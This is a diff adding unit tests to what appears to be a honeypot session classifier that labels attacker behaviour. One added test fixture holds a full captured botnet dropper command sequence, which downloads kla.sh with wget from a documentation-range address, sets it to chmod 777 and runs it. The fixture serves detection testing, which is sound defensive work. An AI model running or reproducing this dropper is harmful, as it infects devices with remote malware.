@@ -394,3 +394,53 @@ def test_a_session_that_only_leaves_is_credential_access(command: str) -> None:
 def test_leaving_after_doing_something_is_not_credential_access() -> None:
     label = classify(facts("uname -a", "exit"))
     assert label.intent is Intent.FINGERPRINTING
+
+
+# --- A full dropper, found by reading one disagreement ---------------------
+#
+# This is a real session, with the attacker's address replaced by one from the
+# RFC 5737 documentation range. Looking at it because the model and the rules
+# agreed on the label but the model's reasoning mentioned a download the rules
+# had not recorded — and the rules were the ones missing something.
+
+DROPPER = (
+    "enable",
+    "linuxshell",
+    "system",
+    "sh",
+    "ls /home; /bin/busybox BOTNET",
+    "cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null "
+    "|| cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;"
+    "wget -O kla.sh http://198.51.100.9/bins/kla.sh 2>/dev/null"
+    "||busybox wget -O kla.sh http://198.51.100.9/bins/kla.sh 2>/dev/null;"
+    "chmod 777 kla.sh;sh kla.sh telnet&",
+)
+
+
+def test_the_whole_dropper_is_recognised_end_to_end() -> None:
+    label = classify(facts(*DROPPER))
+    assert label.intent is Intent.STAGING
+    assert {
+        Behaviour.SHELL_ESCAPE,
+        Behaviour.BUSYBOX_PROBE,
+        Behaviour.FILESYSTEM_DISCOVERY,
+        Behaviour.WRITABLE_DIR_HUNT,
+        Behaviour.PAYLOAD_DOWNLOAD,
+        Behaviour.PERMISSION_CHANGE,
+        Behaviour.PAYLOAD_EXECUTION,
+    } <= label.behaviours
+
+
+def test_walking_a_list_of_directories_is_also_hunting_for_a_writable_one() -> None:
+    """`cd a || cd b || cd c` is the same idea as the `.f` probe sweep."""
+    command = "cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null"
+    assert Behaviour.WRITABLE_DIR_HUNT in classify(facts(command)).behaviours
+
+
+def test_running_a_fetched_script_is_payload_execution() -> None:
+    """Until now this only came from a captured hash, never from a command."""
+    assert Behaviour.PAYLOAD_EXECUTION in classify(facts("sh kla.sh telnet&")).behaviours
+
+
+def test_changing_directory_once_is_not_hunting_for_anything() -> None:
+    assert Behaviour.WRITABLE_DIR_HUNT not in classify(facts("cd /tmp")).behaviours
